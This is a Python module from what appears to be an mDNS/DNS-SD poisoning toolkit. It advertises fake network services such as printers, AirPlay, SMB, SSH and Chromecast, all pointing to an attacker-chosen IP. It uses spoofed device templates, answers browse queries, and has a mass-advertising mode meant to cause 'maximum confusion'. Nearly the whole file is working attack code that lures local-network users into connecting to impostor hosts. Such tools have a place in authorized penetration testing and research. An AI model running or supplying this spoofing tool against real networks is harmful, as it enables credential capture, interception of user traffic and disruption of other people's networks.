"""
service_poison.py - Fake service injection via DNS-SD poisoning.

Advertises fake services on the network. PTR records are shared (no probing
required), so fake services appear alongside legitimate ones with no conflict
resolution.

Supports common service types out of the box.
"""

import time
import sys

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (make_mdns_socket, send_mdns, recv_mdns, parse_packet,
                       build_service_announcement, DNSPacket, QR_RESPONSE,
                       rdata_ptr, rdata_srv, rdata_txt, rdata_a,
                       A, PTR, SRV, TXT, CACHE_FLUSH, IN)


# Common service templates
TEMPLATES = {
    "printer": {
        "type": "_ipp._tcp",
        "port": 631,
        "txt": {"ty": "HP LaserJet Pro", "pdl": "application/postscript",
                "Color": "T", "Duplex": "T"},
    },
    "airplay": {
        "type": "_airplay._tcp",
        "port": 7000,
        "txt": {"deviceid": "AA:BB:CC:DD:EE:FF", "model": "AppleTV5,3",
                "srcvers": "366.0", "features": "0x5A7FFFF7,0x1E"},
    },
    "smb": {
        "type": "_smb._tcp",
        "port": 445,
        "txt": {},
    },
    "ssh": {
        "type": "_ssh._tcp",
        "port": 22,
        "txt": {},
    },
    "http": {
        "type": "_http._tcp",
        "port": 80,
        "txt": {"path": "/"},
    },
    "airdrop": {
        "type": "_airdrop._tcp",
        "port": 8770,
        "txt": {"flags": "0"},
    },
    "chromecast": {
        "type": "_googlecast._tcp",
        "port": 8009,
        "txt": {"id": "deadbeef", "md": "Chromecast Ultra",
                "ve": "05", "fn": "Living Room TV"},
    },
    "raop": {  # AirPlay audio
        "type": "_raop._tcp",
        "port": 7000,
        "txt": {"vs": "366.0", "am": "AppleTV5,3", "tp": "UDP"},
    },
}


def advertise_service(service_type: str, instance_name: str, hostname: str,
                      ip: str, port: int, txt: dict[str, str] | None = None,
                      iface: str | None = None, ttl: int = 4500,
                      interval: int = 20, duration: int = 300):
    """Advertise a fake service continuously."""
    sock = make_mdns_socket(iface)
    fqdn = f"{instance_name}.{service_type}.local."

    print(f"[*] Advertising fake service:")
    print(f"    Type:     {service_type}")
    print(f"    Instance: {instance_name}")
    print(f"    Host:     {hostname}.local. -> {ip}:{port}")
    if txt:
        print(f"    TXT:      {txt}")
    print(f"    TTL:      {ttl}s, re-announce every {interval}s")

    start = time.time()
    count = 0
    try:
        while time.time() - start < duration:
            pkt_data = build_service_announcement(
                service_type, instance_name, hostname, ip, port, txt, ttl)
            send_mdns(sock, pkt_data)
            count += 1

            # Also respond reactively to browse queries
            deadline = time.time() + interval
            while time.time() < deadline:
                result = recv_mdns(sock, timeout=1.0)
                if result is None:
                    continue
                data, (src_ip, _) = result
                parsed = parse_packet(data)
                if not parsed or parsed["is_response"]:
                    continue
                for q in parsed["questions"]:
                    qt = q["name"].lower().rstrip(".")
                    st = f"{service_type}.local".lower()
                    if qt == st or qt == "_services._dns-sd._udp.local":
                        send_mdns(sock, pkt_data)
                        print(f"  [reactive] Query from {src_ip} for {q['name']} -> responded")
                        break

            print(f"  [{count}] Re-announced")
    except KeyboardInterrupt:
        pass

    print(f"[*] Stopped after {count} announcements")
    sock.close()


def from_template(template: str, instance_name: str, hostname: str, ip: str,
                  iface: str | None = None, duration: int = 300):
    """Advertise using a built-in template."""
    if template not in TEMPLATES:
        print(f"Unknown template: {template}")
        print(f"Available: {', '.join(TEMPLATES.keys())}")
        return

    t = TEMPLATES[template]
    advertise_service(t["type"], instance_name, hostname, ip, t["port"],
                      t["txt"], iface, duration=duration)


def mass_advertise(ip: str, hostname: str, iface: str | None = None,
                   duration: int = 300):
    """Advertise ALL template services at once -- maximum confusion."""
    sock = make_mdns_socket(iface)

    services = []
    for name, t in TEMPLATES.items():
        instance = f"Fake {name.title()}"
        services.append((t["type"], instance, t["port"], t["txt"]))

    print(f"[*] Mass service advertisement: {len(services)} services")
    print(f"    All pointing to {hostname}.local. ({ip})")

    start = time.time()
    try:
        while time.time() - start < duration:
            for stype, instance, port, txt in services:
                pkt = build_service_announcement(stype, instance, hostname,
                                                 ip, port, txt)
                send_mdns(sock, pkt)
                time.sleep(0.1)
            print(f"  [*] Full cycle announced")
            time.sleep(15)
    except KeyboardInterrupt:
        pass
    sock.close()


def run(ip: str, hostname: str, template: str | None = None,
        service_type: str | None = None, instance_name: str | None = None,
        port: int | None = None, iface: str | None = None,
        mass: bool = False, duration: int = 300):
    if mass:
        mass_advertise(ip, hostname, iface, duration)
    elif template:
        from_template(template, instance_name or f"Fake {template.title()}",
                      hostname, ip, iface, duration)
    elif service_type and instance_name and port:
        advertise_service(service_type, instance_name, hostname, ip, port,
                          iface=iface, duration=duration)
    else:
        print("Specify --template, --mass, or (--service-type + --instance + --port)")
